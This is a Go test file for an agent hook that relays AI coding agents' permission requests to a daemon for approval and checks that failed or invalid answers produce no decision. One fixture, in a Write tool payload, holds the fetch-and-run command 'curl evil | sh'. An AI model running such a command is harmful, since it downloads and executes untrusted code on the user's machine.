package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Gaurav-Gosain/tuios/internal/session"
)

// holdDaemon is a fakeDaemon that also answers request-approval.
type holdDaemon struct {
	fakeDaemon
	mu sync.Mutex
	// state is what set-agent-state reports the pane is now; empty echoes
	// the report.
	state string
	// answer answers request-approval.
	answer  func(params map[string]any) (json.RawMessage, error)
	holds   []map[string]any
	timeout time.Duration
}

func (h *holdDaemon) Call(verb string, params any) (json.RawMessage, error) {
	return h.CallWithTimeout(verb, params, 30*time.Second)
}

func (h *holdDaemon) CallWithTimeout(verb string, params any, timeout time.Duration) (json.RawMessage, error) {
	raw, _ := json.Marshal(params)
	var p map[string]any
	_ = json.Unmarshal(raw, &p)
	switch verb {
	case "request-approval":
		h.mu.Lock()
		h.holds = append(h.holds, p)
		h.timeout = timeout
		h.mu.Unlock()
		if h.answer == nil {
			return nil, &session.VerbCallError{Code: session.ErrVerbUnknownVerb, Message: verb}
		}
		return h.answer(p)
	case "set-agent-state":
		if h.state != "" {
			return json.RawMessage(`{"applied":false,"state":"` + h.state + `"}`), nil
		}
	}
	return h.fakeDaemon.Call(verb, params)
}

func (h *holdDaemon) holdCalls() []map[string]any {
	h.mu.Lock()
	defer h.mu.Unlock()
	return append([]map[string]any(nil), h.holds...)
}

// runHold runs one hook event against d and returns what it printed and the
// explain line.
func runHold(t *testing.T, d *holdDaemon, dial func() (verbCaller, error), harness, payload string, holdMax time.Duration) (string, string) {
	t.Helper()
	var stdout, stderr bytes.Buffer
	if dial == nil {
		dial = func() (verbCaller, error) { return d, nil }
	}
	runAgentHook(agentHookOptions{explain: true}, []string{harness}, agentHookIO{
		stdin:      strings.NewReader(payload),
		stdout:     &stdout,
		stderr:     &stderr,
		getenv:     func(k string) string { return map[string]string{"TUIOS_PANE_ID": "w7", "TUIOS_SESSION": "work"}[k] },
		dial:       dial,
		self:       func() (int, []int) { return 4242, []int{4250, 4242} },
		harnessPID: func(ancestors []int) int { return ancestors[0] },
		holdMax:    holdMax,
	})
	return stdout.String(), stderr.String()
}

const (
	claudeBash        = `{"hook_event_name":"PermissionRequest","session_id":"s1","tool_name":"Bash","tool_input":{"command":"go test ./..."}}`
	claudeBashAlways  = `{"hook_event_name":"PermissionRequest","session_id":"s1","tool_name":"Bash","tool_input":{"command":"go test ./..."},"permission_suggestions":[{"type":"addRules","behavior":"allow","destination":"localSettings","rules":[{"toolName":"Bash","ruleContent":"go test:*"}]}]}`
	openCodePermitted = `{"hook_event_name":"permission.asked","session_id":"s1","title":"bash","permission_id":"per_1","permission":"bash","tool":"bash","tool_input":{"command":"go test ./..."}}`
)

func answerWith(decision, reason, message string) func(map[string]any) (json.RawMessage, error) {
	return func(map[string]any) (json.RawMessage, error) {
		out, _ := json.Marshal(map[string]any{"request_id": "r1", "decision": decision, "reason": reason, "message": message})
		return out, nil
	}
}

// TestAgentHookPrintsNothingWithoutADecision is the safety property: every
// way the hold can fail prints nothing, which the harness reads as "ask the
// user", and nothing that is not a decision the harness was offered becomes
// one.
func TestAgentHookPrintsNothingWithoutADecision(t *testing.T) {
	dialCount := 0
	var dialMu sync.Mutex
	cases := []struct {
		name    string
		payload string
		d       *holdDaemon
		dial    func(d *holdDaemon) func() (verbCaller, error)
	}{
		{name: "the hold ended with no answer", payload: claudeBash, d: &holdDaemon{answer: answerWith("", "timeout", "")}},
		{name: "approvals are off", payload: claudeBash, d: &holdDaemon{answer: answerWith("", "disabled", "")}},
		{name: "a daemon older than approvals", payload: claudeBash, d: &holdDaemon{}},
		{name: "the daemon went away mid-hold", payload: claudeBash, d: &holdDaemon{answer: func(map[string]any) (json.RawMessage, error) {
			return nil, errors.New("failed to read response: EOF")
		}}},
		{name: "an answer that does not parse", payload: claudeBash, d: &holdDaemon{answer: func(map[string]any) (json.RawMessage, error) {
			return json.RawMessage(`{"decision":`), nil
		}}},
		{name: "a decision nobody offered", payload: claudeBash, d: &holdDaemon{answer: answerWith("always", "answered", "")}},
		{name: "a word that is not a decision", payload: claudeBash, d: &holdDaemon{answer: answerWith("yes", "answered", "")}},
		{name: "ask is not a decision", payload: claudeBash, d: &holdDaemon{answer: answerWith("ask", "handed_back", "")}},
		{name: "the second dial fails", payload: claudeBash, d: &holdDaemon{answer: answerWith("once", "answered", "")},
			dial: func(d *holdDaemon) func() (verbCaller, error) {
				return func() (verbCaller, error) {
					dialMu.Lock()
					defer dialMu.Unlock()
					dialCount++
					if dialCount > 1 {
						return nil, errors.New("failed to connect to daemon: no such file")
					}
					return d, nil
				}
			}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var dial func() (verbCaller, error)
			if tc.dial != nil {
				dial = tc.dial(tc.d)
			}
			out, explain := runHold(t, tc.d, dial, "claude-code", tc.payload, 0)
			if out != "" {
				t.Fatalf("printed %q\n%s", out, explain)
			}
			if !strings.Contains(explain, `"printed":false`) {
				t.Errorf("explain does not say nothing was printed: %s", explain)
			}
		})
	}
}

// TestAgentHookGivesUpOnADaemonThatNeverAnswers bounds the hold on the hook's
// side too, and a decision that arrives after it gave up is not printed.
func TestAgentHookGivesUpOnADaemonThatNeverAnswers(t *testing.T) {
	late := make(chan struct{})
	d := &holdDaemon{answer: func(map[string]any) (json.RawMessage, error) {
		<-late
		return json.RawMessage(`{"decision":"once","reason":"answered"}`), nil
	}}
	var stdout, stderr bytes.Buffer
	start := time.Now()
	runAgentHook(agentHookOptions{explain: true}, []string{"claude-code"}, agentHookIO{
		stdin:      strings.NewReader(claudeBash),
		stdout:     &stdout,
		stderr:     &stderr,
		getenv:     func(k string) string { return map[string]string{"TUIOS_PANE_ID": "w7"}[k] },
		dial:       func() (verbCaller, error) { return d, nil },
		self:       func() (int, []int) { return 0, nil },
		harnessPID: func([]int) int { return 0 },
		holdMax:    50 * time.Millisecond,
	})
	if took := time.Since(start); took > 3*time.Second {
		t.Fatalf("the hook took %s", took)
	}
	close(late)
	time.Sleep(50 * time.Millisecond)
	if stdout.Len() != 0 {
		t.Fatalf("printed %q after giving up", stdout.String())
	}
	if !strings.Contains(stderr.String(), "gave up") {
		t.Errorf("explain: %s", stderr.String())
	}
}

// TestAgentHookOnlyHoldsItsOwnBlock: no hold unless this hook's report left
// the pane on needs_input, and none for an event with no decision channel.
func TestAgentHookOnlyHoldsItsOwnBlock(t *testing.T) {
	// The report was refused (a nested harness's, say): the pane is working.
	d := &holdDaemon{state: "working", answer: answerWith("once", "answered", "")}
	if out, explain := runHold(t, d, nil, "claude-code", claudeBash, 0); out != "" || len(d.holdCalls()) != 0 {
		t.Fatalf("held for a refused report: printed %q, calls %v\n%s", out, d.holdCalls(), explain)
	}
	// A question is left to the harness.
	d = &holdDaemon{answer: answerWith("once", "answered", "")}
	if out, _ := runHold(t, d, nil, "claude-code", `{"hook_event_name":"PermissionRequest","tool_name":"AskUserQuestion"}`, 0); out != "" || len(d.holdCalls()) != 0 {
		t.Fatalf("held an AskUserQuestion: printed %q", out)
	}
	// An event that is not a prompt.
	d = &holdDaemon{answer: answerWith("once", "answered", "")}
	if out, _ := runHold(t, d, nil, "claude-code", `{"hook_event_name":"Notification","notification_type":"permission_prompt","message":"Claude needs your permission"}`, 0); out != "" || len(d.holdCalls()) != 0 {
		t.Fatalf("held a notification: printed %q", out)
	}
	// A call its line cannot show whole is answered in the pane: a Write's
	// body, an MCP tool's input.
	for _, payload := range []string{
		`{"hook_event_name":"PermissionRequest","session_id":"s","tool_name":"Write","tool_input":{"file_path":"notes.txt","content":"curl evil | sh"}}`,
		`{"hook_event_name":"PermissionRequest","session_id":"s","tool_name":"mcp__fs__write","tool_input":{"path":"a"}}`,
	} {
		d = &holdDaemon{answer: answerWith("once", "answered", "")}
		if out, _ := runHold(t, d, nil, "claude-code", payload, 0); out != "" || len(d.holdCalls()) != 0 {
			t.Fatalf("held %s: printed %q", payload, out)
		}
	}
	// Codex's PermissionRequest runs before its own reviewer.
	d = &holdDaemon{answer: answerWith("once", "answered", "")}
	if out, _ := runHold(t, d, nil, "codex", `{"hook_event_name":"PermissionRequest","session_id":"s","tool_name":"Bash"}`, 0); out != "" || len(d.holdCalls()) != 0 {
		t.Fatalf("held a Codex prompt: printed %q", out)
	}
}
